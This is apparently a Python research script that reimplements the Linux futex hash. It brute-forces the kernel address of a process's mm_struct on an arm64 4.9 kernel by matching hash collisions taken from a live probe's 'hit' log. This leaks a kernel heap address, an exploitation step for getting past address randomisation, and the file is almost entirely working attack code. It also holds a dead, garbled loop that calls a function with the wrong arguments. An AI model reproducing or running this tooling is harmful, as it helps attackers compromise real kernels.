#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""debug_g2_winfix.py — 修正线性映射窗口后的 G2 复算

PAGE_OFFSET(VA_BITS=39, 4.9 arm64) = 0xffffffc000000000（线性映射区起点）。
旧窗口 0xffffff8000000000 实为 modules+内核镜像区，mm_struct 不在其内。
网格：结构性 = 16384 对齐 slab 页基址 + 896*j (j=0..17)。
"""
import numpy as np

MASK32 = 0xFFFFFFFF
INITVAL = 0xDEADBEEF
U32 = np.uint32
U64 = np.uint64
np.seterr(over='ignore')

def rol(x, s):
    return ((x << U32(s)) | (x >> U32(32 - s))).astype(U32)

def mix(a, b, c):
    a = (a - c).astype(U32); a = (a ^ rol(c, 4)).astype(U32);  c = (c + b).astype(U32)
    b = (b - a).astype(U32); b = (b ^ rol(a, 6)).astype(U32);  a = (a + c).astype(U32)
    c = (c - b).astype(U32); c = (c ^ rol(b, 8)).astype(U32);  b = (b + a).astype(U32)
    a = (a - c).astype(U32); a = (a ^ rol(c, 16)).astype(U32); c = (c + b).astype(U32)
    b = (b - a).astype(U32); b = (b ^ rol(a, 19)).astype(U32); a = (a + c).astype(U32)
    c = (c - b).astype(U32); c = (c ^ rol(b, 4)).astype(U32);  b = (b + a).astype(U32)
    return a, b, c

def final(a, b, c):
    c ^= b; c = (c - rol(b, 14)).astype(U32)
    a ^= c; a = (a - rol(c, 11)).astype(U32)
    b ^= a; b = (b - rol(a, 25)).astype(U32)
    c ^= b; c = (c - rol(b, 16)).astype(U32)
    a ^= c; a = (a - rol(c, 4)).astype(U32)
    b ^= a; b = (b - rol(a, 14)).astype(U32)
    c ^= b; c = (c - rol(b, 24)).astype(U32)
    return a, b, c

def futex_hash(addr, mm_arr, hsz):
    page = U64(addr & ~U64(0xfff))
    initval = U32(addr & U64(0xfff))
    k0 = (mm_arr & U64(MASK32)).astype(U32)
    k1 = (mm_arr >> U64(32)).astype(U32)
    k2 = (page & U64(MASK32)).astype(U32)
    k3 = (page >> U64(32)).astype(U32)
    a = b = c = (U32(INITVAL) + U32(16) + initval).astype(U32)
    a = (a + k0).astype(U32); b = (b + k1).astype(U32); c = (c + k2).astype(U32)
    a, b, c = mix(a, b, c)
    a = (a + k3).astype(U32)
    a, b, c = final(a, b, c)
    return (c & U32(hsz - 1))

hits = []
with open('live_probe/ks_e2e_result_run2.txt') as f:
    for line in f:
        p = line.split()
        if p and p[0] == 'hit':
            hits.append(int(p[2], 16))
print(f"hits = {len(hits)}")

MM_START = np.uint64(0xffffffc000000000)   # ← 修正：线性映射区
SLAB = np.uint64(16384)
OBJ = np.uint64(896)
NOBJ = 18
WINDOW = np.uint64(8 * 1024**3)

nslabs = int(WINDOW // SLAB)
print(f"window [0xffffffc000000000,+8GB), slabs {nslabs}, candidates {nslabs*NOBJ:,}")

meta = []
for h in hits:
    page = h & ~0xFFF
    meta.append((U32(page & MASK32), U32((page >> 32) & MASK32), U32(h & 0xFFF)))

found = []
CHUNK = 4_000_000
for c0 in range(0, nslabs, CHUNK):
    k = np.arange(c0, min(c0 + CHUNK, nslabs), dtype=U64)
    base = (MM_START + k * SLAB)
    cand = (base[:, None] + OBJ * np.arange(NOBJ, dtype=U64)[None, :]).reshape(-1)
    mm_lo = (cand & U64(MASK32)).astype(U32)
    mm_hi = (cand >> U64(32)).astype(U32)
    ref = None
    alive = np.ones(len(cand), dtype=bool)
    for (p_lo, p_hi, off) in meta:
        h = (futex_hash(0, mm_lo, mm_hi, p_lo, p_hi, off) if False else
             (lambda: None)())
        break
    # 逐 hit 计算哈希
    alive = np.ones(len(cand), dtype=bool)
    ref = None
    for (p_lo, p_hi, off) in meta:
        a = b = c = (U32(INITVAL) + U32(16) + off).astype(U32)
        a = (a + mm_lo).astype(U32); b = (b + mm_hi).astype(U32); c = (c + p_lo).astype(U32)
        a, b, c = mix(a, b, c)
        a = (a + p_hi).astype(U32)
        a, b, c = final(a, b, c)
        h = (c & U32(255))
        if ref is None:
            ref = h
        else:
            alive &= (h == ref)
    n = int(alive.sum())
    if n:
        idx = np.where(alive)[0]
        for i in idx[:16]:
            found.append(int(cand[i]))
        print(f"chunk {c0}: {n} pass, e.g. {[hex(int(cand[i])) for i in idx[:4]]}")

print(f"\nTOTAL strict(hsz=256) candidates: {len(found)}")
for f_ in found[:16]:
    print(f"  mm = 0x{f_:016x}")
